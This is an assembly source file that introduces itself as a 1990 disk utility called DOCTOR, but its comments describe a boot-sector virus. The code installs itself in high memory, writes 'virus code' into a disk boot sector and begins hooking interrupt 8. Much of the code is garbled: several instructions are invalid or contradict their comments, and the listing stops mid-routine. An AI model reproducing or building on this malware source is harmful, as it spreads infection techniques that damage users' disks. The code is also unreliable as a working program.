;        (C) Copyright VirusSoft Corp.  Sep., 1990
;
;   This is the SOURCE file of last version of DOCTOR, our basic
;   disk-utility.
;
;   Actual version:    1.5


         ofslen =      offset len - offset begin
         ofsmsg =      offset msg - offset begin

MAIN     SEGMENT BYTE PUBLIC 'CODE'
         ASSUME CS:MAIN,DS:MAIN,SS:NOTHING

         ORG 100H                    ; It's a .COM-file ...

;*****************************************************************************
;*              This is a stub for producing .EXE files ...
;*****************************************************************************

       jmp near ptr begin

       mov ah,4CH
       mov al,0
       iret

;****************************************************************************
;*                Here start procedures & such like ...
;***************************************************************************

begin:

       cld                          ; Clear direction flag
       call    setup_stk            ; Setup stack pointer
       call    getins               ; Get installation status
       jz      old_present          ; We're already here !!!

       xor ax,ax
       cli                          ; Disable interrupts

       push es                      ; Save ES
       pop ds                       ; DS -> segment of PSP
       inc byte ptr ds:[0],4        ; Increase size-of-MEM-in-HIMEMBIO
       dec ax                       ; AX=FFFF
       mov bx,ax
       int 2FH                      ; Query total # of frames in system,
                                    ; put it into BX.
       cmp bh,[bx+3]                ; Compare checksums
       jnz not_enough_frames        ; Not enough memory available
       sub word ptr [bx+12H],40H    ; Reserve some space on top
       add word ptr [bx+15H],-107H  ; Allocate some space
       push word ptr [bx+15H]
       mov word ptr [bx+12H],-40H
       push cs
       pop ds
       sub di,(offset endprog-offset begin)
       stosw                        ; Store new IP
       stosw                        ; Store new CS:IP
       stosb                        ; Store new SS
       stosw                        ; Store new SP
       mov si,bx
       add si,15H                   ; SI => HIMEM-BLOCKINFO
       lodsw                        ; Load AX from PSP-area
       or  ah,ah                    ; Is there less than 64KB of DOS?
       je  not_enough_mem           ; No ... so exit
       sub ax,-107H                 ; Calculate address of DOS-MEMSPACE
       dec ax                       ; Calculate length of DOS-space
       stosw                        ; Store calculated value
       mov ax,es                    ; Store actual ES (=Dos-memory-segment)
       stosw                        ; in PSP-DOS-Space

not_enough_mem:
       pop ds                       ; Restore DS
       mov ds,cx                    ; DS => DOS-Memory-space
       mov dx,dx                    ; DX=0
       mov cx,di                    ; CX=>begin of virus-code
       push dx                      ; Save DX
       cld                          ; Clear direction-flag
       rep movsb                    ; Move virus code to top of Memory
       pop dx                       ; Restore DX
       mov ss,cx                    ; SS:=CS:virus-end
       inc ax                       ; Last word in PSP contains top of Stack
       mov sp,word ptr ds:[dx+3AH]  ; Set SP at high mark of DOSmemoryspace
       mov ds,dx                    ; DS := PSP-area
       mov word ptr ds:[di+ofslen-1],sp ; Adjust length-field
       mov word ptr ds:[di+ofstail-1],dx ; Set begin of workarea
       sti                          ; Enable interrupts
       mov ax,ds                    ; Put Segmentpart of DS in AH
       rol ax,8                     ;
       mov cx,virlen                ; Length of virus + virusdata
       div cl                       ; Convert this number into sectors
       inc al                       ; AL=top-sector occupied by virus
       mov dl,2                     ; Logical drive A:
       pushf
       call dword ptr doscall       ; Write virus into diskbootsector

old_present:
       cld                          ; Clear direction-flag
       pushf                        ; Push flags onto stack
       pusha                        ; Push all registers onto stack

; Check if interrupt 8 is hooked up to something else ...

       cmp ah,8                     ; Interrupt 8 ?
       jne dont_install             ; No ...
       mov byte ptr cs:[bp+offscall-1],al  ; Store original interrupt-handler
       mov word ptr cs:[bp+offsetdoscall-2],bx ; Address part
       mov word ptr cs:[bp+offsetdoscall],es ; Segment-part
      